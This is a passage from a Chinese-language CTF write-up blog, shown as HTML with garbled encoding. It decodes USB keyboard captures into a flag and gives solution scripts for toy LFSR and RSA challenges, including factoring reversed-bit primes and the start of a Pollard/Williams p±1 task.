class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>            <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>            <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>            <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>            <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>            <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>            <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>            <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>            <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">17</span>:<br>        <span class="hljs-keyword">continue</span><br>    nums.append(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>])<br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] <span class="hljs-keyword">in</span> normalKeys:<br>        <span class="hljs-keyword">if</span> n[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] == <span class="hljs-string">&quot;02&quot;</span>:<br>            output += shiftKeys[n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            output += normalKeys[n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output :&#x27;</span> + output.replace(<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))<br></code></pre></td></tr></table></figure><p>è¾“å‡ºä¸º<code>output :ijniokj tfcfg fgtrdcv iuhbghj jkiuhnm ygvgh_ijnjkmn uhbn tgbnjujm ghytfvb_fghygvb ygbnju &lt;DEL&gt;_eszsd dfresxc hgvbhuhb_uyhbv dcfvg hbu hjkijnm uygbn eszsdx</code></p><p>ä½å¤´çœ‹çœ‹é”®ç›˜ï¼Œå°±ä¼šå‘ç°æ¯ä¸€ç»„å­—æ¯éƒ½æ˜¯åœ¨é”®ç›˜ä¸Šæ‹¼å‡ºä¸€ä¸ªä¸€ä¸ªå­—æ¯çš„å½¢çŠ¶ã€‚</p><p>æœ€åå¾—åˆ°<code>prefer_blue_to_red_switch</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LFSR-Signin"><a href="#LFSR-Signin" class="headerlink" title="LFSR_Signin"></a>LFSR_Signin</h3><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&quot;whuctf&#123;&#125;&quot;</span><br><br>flag = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(bytes_to_long(flag))[<span class="hljs-number">2</span>:])<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">255</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    flag[i] = <span class="hljs-built_in">int</span>(flag[i])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2025</span>):<br>    flag.append(flag[i] ^ flag[i+<span class="hljs-number">20</span>] ^ flag[i+<span class="hljs-number">25</span>] ^ flag[i+<span class="hljs-number">250</span>] ^ flag[-<span class="hljs-number">1</span>])<br>    <span class="hljs-built_in">print</span>(flag[-<span class="hljs-number">1</span>], end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#110000011011110000010101100011111101011011111111111111101011000111001010111000101111101100011011000110011000100010011111110111010110000111111111111101111011011101000000010011110010111000110100110011101110101010110001110100111001100011100001001000000011010011001101001000000000110110100101000110000011011100011100001000010001110000111110000110010001110001101011101110100011010000101101000000000001101111111001010100011110110001101010010100011010011010010110010110100011001100010010010110110010010001111010111100011101100001111111110101011010011111110101000110010000101011011101000000111000001011010010001010101101111111001100010001001011100100111000010100011001001111011110111111101100111001011100001110110110100010011010011111110010111001101000011000011111001101100111001111000010011110011111001010001111110001010100100011001000100011001010010111010000011101011001111111010010010101001010011010000010000100001010111000000000010011011110110001101010010101001010100100010110001001000101000001011111010110101110111100101001100101011000010000101010001010111010111010010110001111010000001101101100101111001010010010011010101110001101001111011010001000010111010011010001011011011000111101010001101110000100100011010011111110110000001101100010011000110100010101010010101100101011001001100010100111011101111100010111100010001101100101100111110101001111101000010110110011000111100110101001111001100110111100111111000101101101000011110011001101100111100111001001001001100101111101110111011111110110101000001100010110101101100100001110100110101100101011010101101101100011011000001111001010001110000110001001011001001110111110000001000011000011000101010101010010010100010011011000011100111011101111110100101111111001011010110010010011101011001011110001101110110110111110100000100001111100101000001101010000011001001100100010101111010100000010110010010111000000010010101001011001011001111001000100010100101000011110110101001011111011111001010111101111000001101101100101111010101100110000111011101100100000011001110011000110110100101010100</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong> é€šè¿‡ä»£ç å¯ä»¥å‘ç°ï¼Œç”Ÿæˆæ—¶ï¼Œæ¯ä¸ªæœ€åè¾¹ç”Ÿæˆçš„äºŒè¿›åˆ¶æ•°å­—éƒ½æ˜¯ç”±å‰è¾¹çš„ä¸€äº›æ•°å­—å¼‚æˆ–å¾—åˆ°ï¼Œé€†å‘æ¥åˆ†æï¼ŒåŒç†ï¼Œæ¯ä¸ªé å‰çš„æ•°å­—ä¹Ÿéƒ½å¯ä»¥ç”±åè¾¹çš„ä¸€äº›æ•°å­—å¾—åˆ°ã€‚<br>ç”±æ­¤ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä»ç¬¬255ä½å¼€å§‹ï¼Œåå‘ä¸€ä¸ªä¸€ä¸ªæ±‚å‡ºå‰255ä¸ªæ•°å­—ã€‚</p><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>enc=<span class="hljs-string">&quot;110000011011110000010101100011111101011011111111111111101011000111001010111000101111101100011011000110011000100010011111110111010110000111111111111101111011011101000000010011110010111000110100110011101110101010110001110100111001100011100001001000000011010011001101001000000000110110100101000110000011011100011100001000010001110000111110000110010001110001101011101110100011010000101101000000000001101111111001010100011110110001101010010100011010011010010110010110100011001100010010010110110010010001111010111100011101100001111111110101011010011111110101000110010000101011011101000000111000001011010010001010101101111111001100010001001011100100111000010100011001001111011110111111101100111001011100001110110110100010011010011111110010111001101000011000011111001101100111001111000010011110011111001010001111110001010100100011001000100011001010010111010000011101011001111111010010010101001010011010000010000100001010111000000000010011011110110001101010010101001010100100010110001001000101000001011111010110101110111100101001100101011000010000101010001010111010111010010110001111010000001101101100101111001010010010011010101110001101001111011010001000010111010011010001011011011000111101010001101110000100100011010011111110110000001101100010011000110100010101010010101100101011001001100010100111011101111100010111100010001101100101100111110101001111101000010110110011000111100110101001111001100110111100111111000101101101000011110011001101100111100111001001001001100101111101110111011111110110101000001100010110101101100100001110100110101100101011010101101101100011011000001111001010001110000110001001011001001110111110000001000011000011000101010101010010010100010011011000011100111011101111110100101111111001011010110010010011101011001011110001101110110110111110100000100001111100101000001101010000011001001100100010101111010100000010110010010111000000010010101001011001011001111001000100010100101000011110110101001011111011111001010111101111000001101101100101111010101100110000111011101100100000011001110011000110110100101010100&quot;</span><br>c=[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2280</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2025</span>):<br>    c[i+<span class="hljs-number">255</span>] = <span class="hljs-built_in">int</span>(enc[i])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">254</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    a=c[i+<span class="hljs-number">255</span>]^c[i+<span class="hljs-number">254</span>]^c[i+<span class="hljs-number">250</span>]^c[i+<span class="hljs-number">20</span>]^c[i+<span class="hljs-number">25</span>]<br>    <span class="hljs-string">&quot;&quot;&quot; if a == c[i]:</span><br><span class="hljs-string">        print(1) &quot;&quot;&quot;</span><br>    c[i]=a<br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>):<br>    res+=<span class="hljs-built_in">str</span>(c[i])<br><span class="hljs-built_in">print</span>(res)<br>m=long_to_bytes(<span class="hljs-built_in">int</span>(res,<span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-comment">#print(c)</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag<code>whuctf&#123;quit3_ea5y_Sign1n_R1ght?&#125;</code></p><h3 id="RSAASR"><a href="#RSAASR" class="headerlink" title="RSAASR"></a>RSAASR</h3><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, isPrime, bytes_to_long, long_to_bytes<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">bit</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = getPrime(bit)<br>        q = rev(p)<br>        <span class="hljs-keyword">if</span> isPrime(q):<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> p, q<br><br><br>rev = <span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(<span class="hljs-built_in">bin</span>(x)[:<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)   <span class="hljs-comment"># äºŒè¿›åˆ¶åè½¬æ•´æ•°</span><br>flag = <span class="hljs-string">b&quot;??????&quot;</span><br>p, q = generate(<span class="hljs-number">512</span>)                    <span class="hljs-comment">#p,qç›¸äº’åè½¬</span><br>n = p * q<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(bytes_to_long(flag), e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n=<span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e=<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c=<span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n=89260288112458610375700543707493254232809306221431627423709616690294586688526862549905410606087786699242563057156677052913617284849136716660502920085006747882186134482309361626185003661858419446057779826705477210404882478906671799290032009310469036065257789664458482249297907582602310789531951177426393110643</span><br><span class="hljs-string">e=65537</span><br><span class="hljs-string">c=34953739673730018843655174314108340461262205663805875643136393046216892771730195951086950749299233260612871271352091804579992550715616098448464010205976283620661044089962336249776561849400241337436006809354102892524119722533361144592982143227173415365371111087024439252557012289555411199194971295453523635612</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong> å‰ªæé¢˜ï¼Œç›´æ¥æ‰“æ¿å­ï¼Œå…·ä½“å¯å‚è€ƒ<a href="https://tangcuxiaojikuai.xyz/post/342113ee.html">Cryptoè¶£é¢˜-å‰ªæ | ç³–é†‹å°é¸¡å—çš„blog</a><br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">89260288112458610375700543707493254232809306221431627423709616690294586688526862549905410606087786699242563057156677052913617284849136716660502920085006747882186134482309361626185003661858419446057779826705477210404882478906671799290032009310469036065257789664458482249297907582602310789531951177426393110643</span><br>c = <span class="hljs-number">34953739673730018843655174314108340461262205663805875643136393046216892771730195951086950749299233260612871271352091804579992550715616098448464010205976283620661044089962336249776561849400241337436006809354102892524119722533361144592982143227173415365371111087024439252557012289555411199194971295453523635612</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">ph,qh,pl,ql</span>):<br>    l = <span class="hljs-built_in">len</span>(ph)<br>    tmp0 = ph + (<span class="hljs-number">512</span>-<span class="hljs-number">2</span>*l)*<span class="hljs-string">&quot;0&quot;</span> + pl<br>    tmp1 = ph + (<span class="hljs-number">512</span>-<span class="hljs-number">2</span>*l)*<span class="hljs-string">&quot;1&quot;</span> + pl<br>    tmq0 = qh + (<span class="hljs-number">512</span>-<span class="hljs-number">2</span>*l)*<span class="hljs-string">&quot;0&quot;</span> + ql<br>    tmq1 = qh + (<span class="hljs-number">512</span>-<span class="hljs-number">2</span>*l)*<span class="hljs-string">&quot;1&quot;</span> + ql<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(tmp0,<span class="hljs-number">2</span>)*<span class="hljs-built_in">int</span>(tmq0,<span class="hljs-number">2</span>) &gt; n):<br>        <span class="hljs-keyword">return</span> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(tmp1,<span class="hljs-number">2</span>)*<span class="hljs-built_in">int</span>(tmq1,<span class="hljs-number">2</span>) &lt; n):<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(pl,<span class="hljs-number">2</span>)*<span class="hljs-built_in">int</span>(ql,<span class="hljs-number">2</span>) % (<span class="hljs-number">2</span>**(l-<span class="hljs-number">1</span>)) != n % (<span class="hljs-number">2</span>**(l-<span class="hljs-number">1</span>))):<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">if</span>(l == <span class="hljs-number">256</span>):<br>        pp0 = <span class="hljs-built_in">int</span>(tmp0,<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span>(n % pp0 == <span class="hljs-number">0</span>):<br>            pf = pp0<br>            qf = n//pp0<br>            phi = (pf-<span class="hljs-number">1</span>)*(qf-<span class="hljs-number">1</span>)<br>            d = inverse(e,phi)<br>            m1 = <span class="hljs-built_in">pow</span>(c,d,n)<br>            <span class="hljs-built_in">print</span>(long_to_bytes(m1))<br>            exit()<br><br>    <span class="hljs-keyword">else</span>:<br>        find(ph+<span class="hljs-string">&quot;1&quot;</span>,qh+<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>+pl,<span class="hljs-string">&quot;1&quot;</span>+ql)<br>        find(ph+<span class="hljs-string">&quot;0&quot;</span>,qh+<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>+pl,<span class="hljs-string">&quot;0&quot;</span>+ql)<br>        find(ph+<span class="hljs-string">&quot;1&quot;</span>,qh+<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>+pl,<span class="hljs-string">&quot;1&quot;</span>+ql)<br>        find(ph+<span class="hljs-string">&quot;0&quot;</span>,qh+<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>+pl,<span class="hljs-string">&quot;0&quot;</span>+ql)<br><br>find(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="Pollard-Williams"><a href="#Pollard-Williams" class="headerlink" title="Pollard &amp; Williams"></a>Pollard &amp; Williams</h3><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>flag = <span class="hljs-string">b&#x27;whuctf&#123;&#125;&#x27;</span><br>blen = <span class="hljs-number">256</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa</span>(<span class="hljs-params">p, q, message</span>):<br>    n = p * q<br>    e = <span class="hljs-number">65537</span><br><br>    pad_length = n.bit_length() // <span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(message) - <span class="hljs-number">2</span><br>    message += os.urandom(pad_length)<br>    m = bytes_to_long(message)<br>    <span class="hljs-keyword">return</span> n, <span class="hljs-built_in">pow</span>(m, e, n)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">part1</span>(<span class="hljs-params">message1, message2</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p1 = getPrime(blen)         <span class="hljs-comment">#256bit</span><br>        p2 = (p1 - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> isPrime(p2):<br>            <span class="hljs-keyword">break</span><br><br>    q1 = getPrime(blen)<br>    q2 = getPrime(blen)<br><br>    <span class="hljs-keyword">return</span> rsa(p1, q1, message1), rsa(p2, q2, message2)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">part2</span>(<span class="hljs-params">message1, message2</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p1 = getPrime(blen)<br>        p2 = (p1 + <span class="hljs-number">1</span>) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> isPrime(p2):<br>            <span class="hljs-keyword">break</span><br><br>    q1 = getPrime(blen)<br>    q2 = getPrime(blen)<br><br>    <span class="hljs-keyword">return</span> rsa(p1, q1, message1), rsa(p2, q2, message2)<br><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">44</span>              <span class="hljs-comment">#é•¿åº¦ä¸º44</span><br>l = <span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">4</span>                  <span class="hljs-comment">#11</span><br>m1, m2, m3, m4 = [flag[i * l: i * l + l] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)] <span class="hljs-comment">#åˆ†æˆå››ä»½</span><br>c1, c2 = part1(m1, m2)<br>c3, c4 = part2(m3, m4)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;c1 = &#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span 